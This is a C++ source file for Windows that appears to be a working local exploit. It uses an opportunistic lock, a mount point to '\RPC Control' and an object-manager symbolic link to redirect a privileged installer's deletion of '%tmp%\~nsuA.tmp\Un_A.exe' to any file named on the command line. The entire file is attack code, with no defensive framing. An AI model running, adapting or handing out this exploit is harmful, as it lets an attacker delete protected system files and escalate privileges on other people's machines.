#include "stdafx.h"

_NT_BEGIN

#include "print.h"

NTSTATUS CreateMountPoint(POBJECT_ATTRIBUTES poa, PCWSTR SubstituteName, PCWSTR PrintName)
{
	NTSTATUS status = STATUS_INTERNAL_ERROR;
	PREPARSE_DATA_BUFFER prdb = 0;
	int len = 0;
	PWSTR PathBuffer = 0;
	ULONG cb = 0;

	while (0 < (len = _snwprintf(PathBuffer, len, L"%ws%c%ws", SubstituteName, 0, PrintName)))
	{
		if (PathBuffer)
		{
			prdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
			prdb->ReparseDataLength = (USHORT)(cb - offsetof(REPARSE_DATA_BUFFER, GenericReparseBuffer));
			prdb->MountPointReparseBuffer.SubstituteNameOffset = 0;
			prdb->MountPointReparseBuffer.SubstituteNameLength = (USHORT)wcslen(SubstituteName) * sizeof(WCHAR);
			prdb->MountPointReparseBuffer.PrintNameOffset = prdb->MountPointReparseBuffer.SubstituteNameLength + sizeof(WCHAR);
			prdb->MountPointReparseBuffer.PrintNameLength = (USHORT)wcslen(PrintName) * sizeof(WCHAR);

			HANDLE hFile;
			IO_STATUS_BLOCK iosb;

			if (0 <= (status = NtCreateFile(&hFile, FILE_ALL_ACCESS, poa, &iosb, 0, 0, FILE_DIRECTORY_FILE,
				FILE_OPEN_IF, FILE_OPEN_REPARSE_POINT | FILE_DIRECTORY_FILE, 0, 0)))
			{
				status = NtFsControlFile(hFile, 0, 0, 0, &iosb, FSCTL_SET_REPARSE_POINT, prdb, cb, 0, 0);
				NtClose(hFile);
			}
			break;
		}

		cb = FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer.PathBuffer[++len]);

		prdb = (PREPARSE_DATA_BUFFER)alloca(cb);

		PathBuffer = prdb->MountPointReparseBuffer.PathBuffer;
	}

	return status;
}

NTSTATUS CreateSymLink(PHANDLE SymbolicLinkHandle, PCWSTR pcsz, PCUNICODE_STRING TargetName)
{
	UNICODE_STRING ObjectName;
	OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, &ObjectName, OBJ_CASE_INSENSITIVE };
	RtlInitUnicodeString(&ObjectName, pcsz);

	return ZwCreateSymbolicLinkObject(SymbolicLinkHandle, SYMBOLIC_LINK_ALL_ACCESS, &oa, TargetName);
}

VOID NTAPI OnApc(
	_In_ PVOID ApcContext,
	_In_ PIO_STATUS_BLOCK /*IoStatusBlock*/,
	_In_ ULONG
)
{
	*(BOOL*)ApcContext = TRUE;
}

NTSTATUS Delete2(PCWSTR pszSrcFile, PCWSTR pszTargetFile)
{
	DbgPrint("[\"%ws\", \"%ws\"]\r\n", pszSrcFile, pszTargetFile);

	NTSTATUS status;
	UNICODE_STRING ObjectName, TargetName;
	PWSTR pszFileName;
	HANDLE hFile;
	IO_STATUS_BLOCK iosb;

	if (0 <= (status = RtlDosPathNameToNtPathName_U_WithStatus(pszTargetFile, &TargetName, 0, 0)))
	{
		OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, &TargetName };

		status = NtOpenFile(&hFile, SYNCHRONIZE, &oa, &iosb, FILE_SHARE_VALID_FLAGS, 0);

		DbgPrint("Open(%wZ)=%x\r\n", &TargetName, status);

		if (0 <= status)
		{
			BOOL b = FALSE;

			status = NtFsControlFile(hFile, 0, OnApc, &b, &iosb, FSCTL_REQUEST_OPLOCK_LEVEL_1, 0, 0, 0, 0);

			DbgPrint("FSCTL_REQUEST_OPLOCK_LEVEL_1 = %x\r\n", status);

			if (STATUS_PENDING == status)
			{
				if (0 <= (status = RtlDosPathNameToNtPathName_U_WithStatus(pszSrcFile, &ObjectName, &pszFileName, 0)))
				{
					pszFileName[-1] = 0;
					RtlInitUnicodeString(oa.ObjectName = &ObjectName, ObjectName.Buffer);

					status = CreateMountPoint(&oa, L"\\RPC Control", L"");

					DbgPrint("CreateMountPoint(%wZ)=%x\r\n", &ObjectName, status);

					if (0 <= status)
					{
						status = STATUS_INTERNAL_ERROR;

						int len = 0;
						PWSTR psz = 0;
						while (0 < (len = _snwprintf(psz, len, L"\\RPC Control\\%ws", pszFileName)))
						{
							if (psz)
							{
								HANDLE hSymLink;

								status = CreateSymLink(&hSymLink, psz, &TargetName);

								DbgPrint("CreateSymLink(%ws -> %wZ)=%x\r\n", psz, &TargetName, status);

								if (0 <= status)
								{
									while (!b)
									{
										SleepEx(INFINITE, TRUE);
									}

									DbgPrint("FSCTL_REQUEST_OPLOCK_LEVEL_1 = [%x, %p]\r\n", iosb.Status, iosb.Information);

									NtClose(hSymLink);
								}
								break;
							}

							psz = (PWSTR)alloca(++len * sizeof(WCHAR));
						}

						HANDLE h;
						if (0 <= NtOpenFile(&h, DELETE, &oa, &iosb, 0, FILE_DELETE_ON_CLOSE | FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT))
						{
							NtClose(h);
						}
					}

					RtlFreeUnicodeString(&ObjectName);
				}

				while (!b)
				{
					SleepEx(INFINITE, TRUE);
				}
			}

			NtClose(hFile);
		}

		RtlFreeUnicodeString(&TargetName);
	}

	return status;
}

NTSTATUS Delete2Ex(PCWSTR pszSrcFile, PCWSTR pszTargetFile)
{
	PWSTR psz = 0;
	ULONG cch = 0;
	while (cch = ExpandEnvironmentStringsW(pszSrcFile, psz, cch))
	{
		if (psz)
		{
			return Delete2(psz, pszTargetFile);
		}

		psz = (PWSTR)alloca(cch * sizeof(WCHAR));
	}

	return GetLastError();
}

void WINAPI ep(void*)
{
	PrintInfo pi;
	InitPrintf();

	DbgPrint("cmd: \"%ws\"\r\n", GetCommandLineW());

	NTSTATUS status = STATUS_INVALID_PARAMETER;

	if (PWSTR pa = wcschr(GetCommandLineW(), '*'))
	{
		if (PWSTR pb = wcschr(++pa, '*'))
		{
			*pb = 0;
			status = Delete2Ex(L"%tmp%\\~nsuA.tmp\\Un_A.exe", pa);
		}
	}

	PrintError(status);

	ExitProcess(0);
}

_NT_END